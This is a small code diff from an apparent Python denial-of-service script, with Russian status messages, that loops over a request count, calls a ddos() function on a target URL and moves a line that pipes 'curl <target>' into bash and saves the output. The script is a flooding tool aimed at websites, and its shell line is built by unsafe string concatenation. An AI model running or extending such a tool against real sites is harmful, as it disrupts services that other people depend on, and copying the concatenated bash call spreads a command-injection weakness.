@@ -44,10 +44,10 @@ ping = perf()
 for attack in range(requests):
 	try:
 		ddos(https)
-		client('echo "curl ' + https + '" | bash > ' + https.replace('.', '').replace('https://', '') + '.html')
 		color(1)
 		print('Запрос ' + str(int(attack) + 1) + ' отправлен на ' + https.replace('https://', ''))
 		color(0)
+		client('echo "curl ' + https + '" | bash > ' + https.replace('.', '').replace('https://', '') + '.html')
 	except Exception as exc:
 		color(2)
 		print('Запрос ' + str(int(attack) + 1) + ' не отправлен: ' + str(exc))
